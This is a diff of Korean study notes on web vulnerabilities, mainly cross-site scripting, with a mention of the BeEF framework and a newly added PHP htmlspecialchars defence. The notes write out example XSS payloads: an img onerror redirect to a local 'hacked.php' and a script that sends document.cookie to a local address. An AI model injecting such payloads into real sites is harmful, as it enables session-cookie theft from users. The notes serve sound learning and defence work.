@@ -101,7 +101,7 @@ sudo /opt/lampp/manager-linux-x64.run
 
 - 사이트 간 스크립팅(또는 크로스 사이트 스크립팅, 영문 명칭 cross-site scripting, 영문 약어 XSS)은 웹 애플리케이션에서 많이 나타나는 취약점의 하나로 웹사이트 관리자가 아닌 이가 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점이다.
 
-- 클라이언트 쪽의 웹브라우저를 공격하는 기법. `<script>`와 같은 입력값이 그대로 웹페이지에 표시되면 위험. 자바스크립트를 이용해 세션쿠키를 탈취
+- 클라이언트 쪽의 웹브라우저를 공격하는 기법. `<script>`와 같은 입력값이 그대로 웹페이지에 표시되면 위험. 자바스크립트를 이용해 세션쿠키를 탈취. 혹은 `<img src=x onerror=window.location.assign("http://127.0.0.1/hacked.php)>` 이나 `<svg>` 태그도 시도해볼 수 있다.
 
 1. Reflected XSS 공격
 
@@ -112,7 +112,9 @@ sudo /opt/lampp/manager-linux-x64.run
 
 - 서버에 직접 `<script>`코드를 삽입. 예로 `<script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>
 
-3. BeEF xss framework 사용(칼리리눅스에 내장)
+3. BeEF xss framework 사용.
+
+- 대응방안 : php의 경우 `htmlspecialchars`이라는 함수를 사용한다. 그럼 `<>` 태그가 작동하지 않는다.
 
 ### sql 인젝션
 
